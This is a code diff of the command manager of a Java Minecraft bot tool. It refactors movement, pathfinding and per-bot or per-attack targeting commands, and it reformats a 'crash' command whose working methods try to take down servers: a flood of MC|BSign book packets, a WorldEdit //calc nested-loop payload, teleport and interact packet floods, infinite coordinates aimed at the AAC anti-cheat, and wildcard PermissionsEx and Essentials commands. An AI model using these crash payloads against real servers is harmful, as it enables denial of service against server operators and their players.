@@ -34,6 +34,7 @@ import com.mojang.brigadier.CommandDispatcher;
 import com.mojang.brigadier.arguments.DoubleArgumentType;
 import com.mojang.brigadier.arguments.IntegerArgumentType;
 import com.mojang.brigadier.arguments.StringArgumentType;
+import com.mojang.brigadier.context.CommandContext;
 import com.mojang.brigadier.exceptions.CommandSyntaxException;
 import com.mojang.brigadier.suggestion.Suggestion;
 import com.mojang.brigadier.tree.CommandNode;
@@ -54,6 +55,7 @@ import javax.imageio.ImageIO;
 import javax.inject.Inject;
 import lombok.Getter;
 import lombok.RequiredArgsConstructor;
+import lombok.SneakyThrows;
 import lombok.extern.slf4j.Slf4j;
 import net.pistonmaster.soulfire.brigadier.CommandHelpWrapper;
 import net.pistonmaster.soulfire.brigadier.ConsoleSubject;
@@ -152,7 +154,7 @@ public class ServerCommandManager {
                             "Makes all connected bots walk to the y coordinates",
                             c -> {
                               var y = IntegerArgumentType.getInteger(c, "y");
-                              return executePathfinding(new YGoal(y));
+                              return executePathfinding(c, new YGoal(y));
                             })))
             .then(
                 argument("x", IntegerArgumentType.integer())
@@ -165,7 +167,7 @@ public class ServerCommandManager {
                                       var x = IntegerArgumentType.getInteger(c, "x");
                                       var z = IntegerArgumentType.getInteger(c, "z");
 
-                                      return executePathfinding(new XZGoal(x, z));
+                                      return executePathfinding(c, new XZGoal(x, z));
                                     }))))
             .then(
                 argument("x", IntegerArgumentType.integer())
@@ -181,7 +183,7 @@ public class ServerCommandManager {
                                               var y = IntegerArgumentType.getInteger(c, "y");
                                               var z = IntegerArgumentType.getInteger(c, "z");
 
-                                              return executePathfinding(new PosGoal(x, y, z));
+                                              return executePathfinding(c, new PosGoal(x, y, z));
                                             }))))));
     dispatcher.register(
         literal("stop-path")
@@ -190,6 +192,7 @@ public class ServerCommandManager {
                     "Makes all connected bots stop pathfinding",
                     c ->
                         forEveryBot(
+                            c,
                             bot -> {
                               EventUtil.runAndAssertChanged(
                                   bot.eventBus(),
@@ -233,74 +236,78 @@ public class ServerCommandManager {
                                               var z = DoubleArgumentType.getDouble(c, "z");
 
                                               return forEveryBot(
+                                                  c,
                                                   bot -> {
-                                                    var sessionDataManager =
-                                                        bot.sessionDataManager();
-                                                    var clientEntity =
-                                                        sessionDataManager.clientEntity();
-
-                                                    clientEntity.lookAt(
-                                                        RotationOrigin.EYES,
-                                                        Vector3d.from(x, y, z));
+                                                    bot.sessionDataManager()
+                                                        .clientEntity()
+                                                        .lookAt(
+                                                            RotationOrigin.EYES,
+                                                            Vector3d.from(x, y, z));
                                                     return Command.SINGLE_SUCCESS;
                                                   });
                                             }))))));
     dispatcher.register(
-        literal("forward")
-            .executes(
-                help(
-                    "Toggle walking forward for all connected bots",
-                    c ->
-                        forEveryBot(
-                            bot -> {
-                              bot.sessionDataManager().controlState().forward(
-                            !bot.sessionDataManager().controlState().forward()
-                    );
-                    bot.sessionDataManager().controlState().backward(false);
-                              return Command.SINGLE_SUCCESS;
-                            }))));
-    dispatcher.register(
-        literal("backward")
-            .executes(
-                help(
-                    "Toggles walking backward for all connected bots",
-                    c ->
-                        forEveryBot(
-                            bot -> {
-                              bot.sessionDataManager().controlState().backward(
-                            !bot.sessionDataManager().controlState().backward()
-                    );
-                    bot.sessionDataManager().controlState().forward(false);
-                              return Command.SINGLE_SUCCESS;
-                            }))));
-    dispatcher.register(
-        literal("left")
-            .executes(
-                help(
-                    "Toggles walking left for all connected bots",
-                    c ->
-                        forEveryBot(
-                            bot -> {
-                              bot.sessionDataManager().controlState().left(
-                            !bot.sessionDataManager().controlState().left()
-                    );
-                    bot.sessionDataManager().controlState().right(false);
-                              return Command.SINGLE_SUCCESS;
-                            }))));
-    dispatcher.register(
-        literal("right")
-            .executes(
-                help(
-                    "Toggles walking right for all connected bots",
-                    c ->
-                        forEveryBot(
-                            bot -> {
-                              bot.sessionDataManager().controlState().right(
-                            !bot.sessionDataManager().controlState().right()
-                    );
-                    bot.sessionDataManager().controlState().left(false);
-                              return Command.SINGLE_SUCCESS;
-                            }))));
+        literal("move")
+            .then(
+                literal("forward")
+                    .executes(
+                        help(
+                            "Toggle walking forward for all connected bots",
+                            c ->
+                                forEveryBot(
+                                    c,
+                                    bot -> {
+                                      var controlState = bot.sessionDataManager().controlState();
+
+                                      controlState.forward(!controlState.forward());
+                                      controlState.backward(false);
+                                      return Command.SINGLE_SUCCESS;
+                                    }))))
+            .then(
+                literal("backward")
+                    .executes(
+                        help(
+                            "Toggle walking backward for all connected bots",
+                            c ->
+                                forEveryBot(
+                                    c,
+                                    bot -> {
+                                      var controlState = bot.sessionDataManager().controlState();
+
+                                      controlState.backward(!controlState.backward());
+                                      controlState.forward(false);
+                                      return Command.SINGLE_SUCCESS;
+                                    }))))
+            .then(
+                literal("left")
+                    .executes(
+                        help(
+                            "Toggle walking left for all connected bots",
+                            c ->
+                                forEveryBot(
+                                    c,
+                                    bot -> {
+                                      var controlState = bot.sessionDataManager().controlState();
+
+                                      controlState.left(!controlState.left());
+                                      controlState.right(false);
+                                      return Command.SINGLE_SUCCESS;
+                                    }))))
+            .then(
+                literal("right")
+                    .executes(
+                        help(
+                            "Toggle walking right for all connected bots",
+                            c ->
+                                forEveryBot(
+                                    c,
+                                    bot -> {
+                                      var controlState = bot.sessionDataManager().controlState();
+
+                                      controlState.right(!controlState.right());
+                                      controlState.left(false);
+                                      return Command.SINGLE_SUCCESS;
+                                    })))));
     dispatcher.register(
         literal("jump")
             .executes(
@@ -308,17 +315,23 @@ public class ServerCommandManager {
                     "Toggle jumping for all connected bots",
                     c ->
                         forEveryBot(
+                            c,
                             bot -> {
-                              var sessionDataManager = bot.sessionDataManager();
+                              var controlState = bot.sessionDataManager().controlState();
 
-                              sessionDataManager.controlState().jumping(
-                            !sessionDataManager.controlState().jumping()
-                    );
-                    return Command.SINGLE_SUCCESS;
-                }))));
-        dispatcher.register(literal("sneak")
-                .executes(help("Toggle sneaking for all connected bots", c -> forEveryBot(bot -> {
-                    bot.botControl().toggleSneak();
+                              controlState.jumping(!controlState.jumping());
+                              return Command.SINGLE_SUCCESS;
+                            }))));
+    dispatcher.register(
+        literal("sneak")
+            .executes(
+                help(
+                    "Toggle sneaking for all connected bots",
+                    c ->
+                        forEveryBot(
+                            c,
+                            bot -> {
+                              bot.botControl().toggleSneak();
                               return Command.SINGLE_SUCCESS;
                             }))));
     dispatcher.register(
@@ -328,6 +341,7 @@ public class ServerCommandManager {
                     "Resets the movement of all connected bots",
                     c ->
                         forEveryBot(
+                            c,
                             bot -> {
                               bot.sessionDataManager().controlState().resetAll();
                               return Command.SINGLE_SUCCESS;
@@ -341,6 +355,7 @@ public class ServerCommandManager {
                     "Stops the ongoing attacks",
                     c ->
                         forEveryAttack(
+                            c,
                             attackManager -> {
                               soulFireServer.stopAttack(attackManager.id());
                               return Command.SINGLE_SUCCESS;
@@ -354,6 +369,7 @@ public class ServerCommandManager {
                     "Shows connected bots from all attacks",
                     c ->
                         forEveryAttackEnsureHasBots(
+                            c,
                             attackManager -> {
                               var online = new ArrayList<String>();
                               for (var bot : attackManager.botConnections()) {
@@ -380,6 +396,7 @@ public class ServerCommandManager {
                               var message = StringArgumentType.getString(c, "message");
 
                               return forEveryBot(
+                                  c,
                                   bot -> {
                                     if (!bot.isOnline()) {
                                       return Command.SINGLE_SUCCESS;
@@ -397,6 +414,7 @@ public class ServerCommandManager {
                     "Shows network stats",
                     c ->
                         forEveryAttackEnsureHasBots(
+                            c,
                             attackManager -> {
                               log.info("Total bots: {}", attackManager.botConnections().size());
                               long readTraffic = 0;
@@ -457,6 +475,7 @@ public class ServerCommandManager {
                               var currentTime = System.currentTimeMillis();
 
                               return forEveryBot(
+                                  c,
                                   bot -> {
                                     var mapDataState =
                                         bot.sessionDataManager().mapDataStates().get(mapId);
@@ -487,136 +506,165 @@ public class ServerCommandManager {
                                   });
                             }))));
 
-        dispatcher.register(literal("crash")
-                .then(argument("method", StringArgumentType.greedyString())
-                        .executes(help("Attempts to crash the server", c -> {
-                            var method = StringArgumentType.getString(c, "method");
+    dispatcher.register(
+        literal("crash")
+            .then(
+                argument("method", StringArgumentType.greedyString())
+                    .executes(
+                        help(
+                            "Attempts to crash the server",
+                            c -> {
+                              var method = StringArgumentType.getString(c, "method");
 
-                            log.info("Attempting to crash the server with method: {}", method);
+                              log.info("Attempting to crash the server with method: {}", method);
 
-                            return switch (method) {
+                              return switch (method) {
                                 case "book" -> {
-                                    try {
-
-                                        byte[] data = Files.readAllBytes(Path.of("book.cap"));
-                                        ServerboundCustomPayloadPacket packet = new ServerboundCustomPayloadPacket("MC|BSign", data);
-                                        forEveryBot((bot) -> {
-                                            for (int i = 0; i < 150; i++) {
-                                                bot.sessionDataManager().sendPacket(packet);
-                                            }
-                                            return Command.SINGLE_SUCCESS;
+                                  try {
+                                    var data = Files.readAllBytes(Path.of("book.cap"));
+                                    var packet =
+                                        new ServerboundCustomPayloadPacket("MC|BSign", data);
+                                    forEveryBot(
+                                        c,
+                                        (bot) -> {
+                                          for (var i = 0; i < 150; i++) {
+                                            bot.sessionDataManager().sendPacket(packet);
+                                          }
+                                          return Command.SINGLE_SUCCESS;
                                         });
-                                    } catch (IOException e) {
-                                        log.error("Failed to read book.cap", e);
-                                    }
-                                    yield Command.SINGLE_SUCCESS;
+                                  } catch (IOException e) {
+                                    log.error("Failed to read book.cap", e);
+                                  }
+                                  yield Command.SINGLE_SUCCESS;
                                 }
                                 case "calc" -> {
-                                    forEveryBot((bot) -> { // Work
-                                        bot.botControl().sendMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
+                                  forEveryBot(
+                                      c,
+                                      (bot) -> { // Work
+                                        bot.botControl()
+                                            .sendMessage(
+                                                "//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
                                         return Command.SINGLE_SUCCESS;
-                                    });
-                                    yield Command.SINGLE_SUCCESS;
+                                      });
+                                  yield Command.SINGLE_SUCCESS;
                                 }
                                 case "fly" -> {
-                                    forEveryBot((bot) -> {
-                                        double botX = bot.sessionDataManager().clientEntity().x();
-                                        double botY = bot.sessionDataManager().clientEntity().y();
-                                        double botZ = bot.sessionDataManager().clientEntity().z();
+                                  forEveryBot(
+                                      c,
+                                      (bot) -> {
+                                        var botX = bot.sessionDataManager().clientEntity().x();
+                                        var botY = bot.sessionDataManager().clientEntity().y();
+                                        var botZ = bot.sessionDataManager().clientEntity().z();
 
                                         while (botY < 256) {
-                                            botY += 9;
-                                            ServerboundMovePlayerPosPacket packet = new ServerboundMovePlayerPosPacket(
-                                                    true,
-                                                    botX,
-                                                    botY,
-                                                    botZ
-                                            );
-                                            bot.sessionDataManager().sendPacket(packet);
+                                          botY += 9;
+                                          var packet =
+                                              new ServerboundMovePlayerPosPacket(
+                                                  true, botX, botY, botZ);
+                                          bot.sessionDataManager().sendPacket(packet);
                                         }
 
-                                        for (int i = 0; i < 10000; i++) {
-                                            botX += 9;
-                                            ServerboundMovePlayerPosPacket packet = new ServerboundMovePlayerPosPacket(
-                                                    true,
-                                                    botX,
-                                                    botY,
-                                                    botZ
-                                            );
-                                            bot.sessionDataManager().sendPacket(packet);
+                                        for (var i = 0; i < 10000; i++) {
+                                          botX += 9;
+                                          var packet =
+                                              new ServerboundMovePlayerPosPacket(
+                                                  true, botX, botY, botZ);
+                                          bot.sessionDataManager().sendPacket(packet);
                                         }
 
                                         return Command.SINGLE_SUCCESS;
-                                    });
-                                    yield Command.SINGLE_SUCCESS;
+                                      });
+                                  yield Command.SINGLE_SUCCESS;
                                 }
                                 case "sleep" -> {
-                                    forEveryBot((bot) -> {
-                                        // TODO: 17/02/2024 check if there is a specific packet for leaving bed
-                                        ServerboundInteractPacket packet = new ServerboundInteractPacket(
+                                  forEveryBot(
+                                      c,
+                                      (bot) -> {
+                                        // TODO: 17/02/2024 check if there is a specific packet for
+                                        // leaving bed
+                                        var packet =
+                                            new ServerboundInteractPacket(
                                                 bot.sessionDataManager().clientEntity().entityId(),
                                                 InteractAction.INTERACT,
                                                 Hand.MAIN_HAND,
-                                                false
-                                        );
+                                                false);
 
-                                        for (int i = 0; i < 2000; i++) {
-                                            bot.sessionDataManager().sendPacket(packet);
+                                        for (var i = 0; i < 2000; i++) {
+                                          bot.sessionDataManager().sendPacket(packet);
                                         }
 
                                         return Command.SINGLE_SUCCESS;
-                                    });
-                                    yield Command.SINGLE_SUCCESS;
+                                      });
+                                  yield Command.SINGLE_SUCCESS;
                                 }
                                 case "permissionsex" -> { // Work
-                                    forEveryBot((bot) -> {
+                                  forEveryBot(
+                                      c,
+                                      (bot) -> {
                                         bot.botControl().sendMessage("/promote * a");
                                         return Command.SINGLE_SUCCESS;
-                                    });
-                                    yield Command.SINGLE_SUCCESS;
+                                      });
+                                  yield Command.SINGLE_SUCCESS;
                                 }
                                 case "aac" -> {
-                                    // TODO: 17/02/2024 find old version of AAC crack to test
-                                    ServerboundMovePlayerPosPacket packet = new ServerboundMovePlayerPosPacket(
-                                            true,
-                                            Double.NEGATIVE_INFINITY,
-                                            Double.NEGATIVE_INFINITY,
-                                            Double.NEGATIVE_INFINITY
-                                    );
-                                    forEveryBot((bot) -> {
+                                  // TODO: 17/02/2024 find old version of AAC crack to test
+                                  var packet =
+                                      new ServerboundMovePlayerPosPacket(
+                                          true,
+                                          Double.NEGATIVE_INFINITY,
+                                          Double.NEGATIVE_INFINITY,
+                                          Double.NEGATIVE_INFINITY);
+                                  forEveryBot(
+                                      c,
+                                      (bot) -> {
                                         bot.sessionDataManager().sendPacket(packet);
                                         return Command.SINGLE_SUCCESS;
-                                    });
-                                    yield Command.SINGLE_SUCCESS;
+                                      });
+                                  yield Command.SINGLE_SUCCESS;
                                 }
                                 case "essentials" -> {
-                                    forEveryBot((bot) -> {
+                                  forEveryBot(
+                                      c,
+                                      (bot) -> {
                                         bot.botControl().sendMessage("/pay * a a");
                                         return Command.SINGLE_SUCCESS;
-                                    });
-                                    yield Command.SINGLE_SUCCESS;
+                                      });
+                                  yield Command.SINGLE_SUCCESS;
                                 }
                                 case "anvil" -> {
-                                    // try damage 3 and 16384
-                                    log.error("Anvil crash not implemented yet!");
-                                    yield Command.SINGLE_SUCCESS;
+                                  // try damage 3 and 16384
+                                  log.error("Anvil crash not implemented yet!");
+                                  yield Command.SINGLE_SUCCESS;
                                 }
                                 case "chest" -> {
-                                    // create huge NBT data on chest and place the most possible chest to "crash" the area
-                                    log.error("Chest crash not implemented yet!");
-                                    yield Command.SINGLE_SUCCESS;
+                                  // create huge NBT data on chest and place the most possible chest
+                                  // to "crash" the area
+                                  log.error("Chest crash not implemented yet!");
+                                  yield Command.SINGLE_SUCCESS;
                                 }
                                 default -> {
-                                    log.error("Unknown crash method: {}", method);
-                                    yield Command.SINGLE_SUCCESS;
+                                  log.error("Unknown crash method: {}", method);
+                                  yield Command.SINGLE_SUCCESS;
                                 }
-                            };
-                        }))));
+                              };
+                            }))));
 
     SoulFireAPI.postEvent(new DispatcherInitEvent(dispatcher));
+
+    dispatcher.register(
+        literal("bot")
+            .then(
+                argument("bot_name", StringArgumentType.string()).redirect(dispatcher.getRoot())));
+
+    dispatcher.register(
+        literal("attack")
+            .then(
+                argument("attack_id", IntegerArgumentType.integer(0))
+                    .redirect(dispatcher.getRoot())));
   }
 
-  private int forEveryAttack(ToIntFunction<AttackManager> consumer) {
+  private int forEveryAttack(
+      CommandContext<ConsoleSubject> context, ToIntFunction<AttackManager> consumer) {
     if (soulFireServer.attacks().isEmpty()) {
       log.warn("No attacks found!");
       return 2;
@@ -624,6 +672,11 @@ public class ServerCommandManager {
 
     var resultCode = Command.SINGLE_SUCCESS;
     for (var attackManager : soulFireServer.attacks().values()) {
+      if (hasArgument(context, "attack_id")
+          && attackManager.id() != IntegerArgumentType.getInteger(context, "attack_id")) {
+        continue;
+      }
+
       log.info("--- Running command for attack {} ---", attackManager.id());
       var result = consumer.applyAsInt(attackManager);
       if (result != Command.SINGLE_SUCCESS) {
@@ -634,8 +687,10 @@ public class ServerCommandManager {
     return resultCode;
   }
 
-  private int forEveryAttackEnsureHasBots(ToIntFunction<AttackManager> consumer) {
+  private int forEveryAttackEnsureHasBots(
+      CommandContext<ConsoleSubject> context, ToIntFunction<AttackManager> consumer) {
     return forEveryAttack(
+        context,
         attackManager -> {
           if (attackManager.botConnections().isEmpty()) {
             log.warn("No bots connected!");
@@ -646,11 +701,21 @@ public class ServerCommandManager {
         });
   }
 
-  private int forEveryBot(ToIntFunction<BotConnection> consumer) {
+  private int forEveryBot(
+      CommandContext<ConsoleSubject> context, ToIntFunction<BotConnection> consumer) {
     return forEveryAttackEnsureHasBots(
+        context,
         attackManager -> {
           var resultCode = Command.SINGLE_SUCCESS;
           for (var bot : attackManager.botConnections()) {
+            if (hasArgument(context, "bot_name")
+                && !bot.meta()
+                    .minecraftAccount()
+                    .username()
+                    .equals(StringArgumentType.getString(context, "bot_name"))) {
+              continue;
+            }
+
             log.info(
                 "--- Running command for bot {} ---", bot.meta().minecraftAccount().username());
             var result = consumer.applyAsInt(bot);
@@ -663,8 +728,9 @@ public class ServerCommandManager {
         });
   }
 
-  private int executePathfinding(GoalScorer goalScorer) {
+  private int executePathfinding(CommandContext<ConsoleSubject> context, GoalScorer goalScorer) {
     return forEveryBot(
+        context,
         bot -> {
           var logger = bot.logger();
           var executorService = bot.executorManager().newExecutorService(bot, "PathfindingManager");
@@ -839,6 +905,15 @@ public class ServerCommandManager {
             restricted);
       }
     }
+  }
+
+  @SneakyThrows
+  private static boolean hasArgument(CommandContext<?> context, String name) {
+    var argumentsField = CommandContext.class.getDeclaredField("arguments");
+    argumentsField.setAccessible(true);
+    var arguments = (Map<?, ?>) argumentsField.get(context);
+
+    return arguments.containsKey(name);
   }
 
   private record HelpData(String command, String help) {}
